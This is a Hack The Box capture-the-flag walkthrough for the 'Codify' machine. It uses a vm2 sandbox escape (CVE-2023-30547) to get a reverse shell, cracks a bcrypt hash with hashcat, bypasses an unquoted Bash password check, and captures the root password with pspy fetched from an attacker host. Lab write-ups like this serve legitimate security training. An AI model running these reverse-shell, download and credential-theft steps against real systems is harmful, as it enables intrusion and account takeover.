# Hack the Box: Codify Writeup

**Room Link:** [Codify](https://app.hackthebox.com/machines/Codify)

---

## Initial Enumeration

We start with an Nmap scan:

```
nmap <target-ip>
```

**Results:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

Port 3000 stands out. We add `<target-ip> codify.htb` to `/etc/hosts` and check out the web server.

---

## Web Enumeration

The website is a Node.js code testing sandbox. It allows users to run JavaScript in a sandboxed environment. The About page reveals the sandbox uses the **vm2** library, version **3.9.16**.

A quick search confirms that vm2 is deprecated and riddled with critical sandbox escape vulnerabilities. One in particular looks promising:

**CVE-2023-30547** — A vulnerability in exception sanitization for vm2 versions up to 3.9.16. Attackers can raise an unsanitized host exception inside `handleException()` to escape the sandbox and execute arbitrary code on the host.

---

## Exploitation: vm2 Sandbox Escape

We find a [proof of concept exploit](https://github.com/user0x1337/CVE-2023-30547/blob/main/exploit.py) and use it to get a reverse shell.

**Step 1:** Start a listener:

```
nc -lvnp 1234
```

**Step 2:** Run the exploit:

```
python exploit.py --url http://codify.htb/run --lhost <attacker-ip> --lport 1234
```

We land a shell as `svc`:

```
svc@codify:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

**Step 3:** Upgrade to a fully interactive shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo;fg
# ENTER twice
export TERM=xterm
```

---

## Lateral Movement: svc → joshua

We see `/home/joshua` but can't read `user.txt`. We need to pivot to joshua.

### Discovering Credentials in SQLite

Exploring the web directories, we find a SQLite database:

```
svc@codify:/var/www/contact$ ls
index.js  package.json  package-lock.json  templates  tickets.db
```

Dumping the database reveals a users table with a bcrypt hash for joshua:

```
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

### Cracking the Hash

We crack the bcrypt hash with Hashcat:

```
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked password:** `spongebob1`

### User Flag

```
ssh joshua@codify.htb
joshua@codify:~$ cat user.txt
```

---

## Privilege Escalation: joshua → root

Checking sudo permissions:

```
joshua@codify:~$ sudo -l
User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

### Analyzing the Backup Script

```
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

The script reads the root password from `/root/.creds` and compares it with user input. The critical flaw is in the comparison: `[[ $DB_PASS == $USER_PASS ]]` — because `$USER_PASS` is **unquoted**, Bash interprets it as a glob pattern. Entering `*` matches any string, bypassing the password check entirely.

### Extracting the Real Password with pspy

The bypass gets us past the check, but the script then uses the **real** password (from `/root/.creds`) in the `mysqldump` command. We can snoop this with `pspy`.

**Step 1:** Download pspy onto the target:

```
# On attacker:
python3 -m http.server 8000

# On target:
wget http://<attacker-ip>:8000/pspy64
chmod +x pspy64
```

**Step 2:** In one SSH session, run pspy:

```
./pspy64
```

**Step 3:** In a second SSH session, run the backup script and enter `*` as the password:

```
sudo /opt/scripts/mysql-backup.sh
```

**Step 4:** In the pspy output, we see the real password leaked in the `mysqldump` command line:

```
CMD: UID=0  PID=2520  | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;
```

**Root's password:** `kljh12k3jhaskjh12kjh3`

### Root Flag

```
su root
cat /root/root.txt
```
